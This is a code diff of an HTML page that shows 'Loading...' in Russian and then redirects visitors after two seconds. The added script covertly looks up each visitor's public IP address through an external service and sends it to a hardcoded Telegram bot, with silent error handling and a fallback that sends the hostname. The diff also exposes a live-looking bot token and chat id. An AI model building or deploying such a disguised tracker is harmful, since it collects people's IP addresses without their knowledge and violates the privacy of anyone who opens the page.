@@ -8,11 +8,26 @@
     <h1>Загрузка...</h1>
     <script>
         window.onload = function() {
-            var ip = window.location.hostname;
-            var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
-            var chat_id = "8212240529";
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
-            fetch(url).catch(function() {});
+            // Получаем реальный IP через API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var real_ip = data.ip;
+                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
+                    var chat_id = "8212240529";
+                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + real_ip;
+                    fetch(url).catch(function() {});
+                })
+                .catch(function() {
+                    // Если API не сработал — отправляем хотя бы домен
+                    var ip = window.location.hostname;
+                    var token = "8984823205:AAHz862DzTswOfq4HqT74EHMYl1apCoiXAg";
+                    var chat_id = "8212240529";
+                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
+                    fetch(url).catch(function() {});
+                });
+
+            // Переадресация через 2 секунды
             setTimeout(function() {
                 window.location.href = "https://example.com";
             }, 2000);
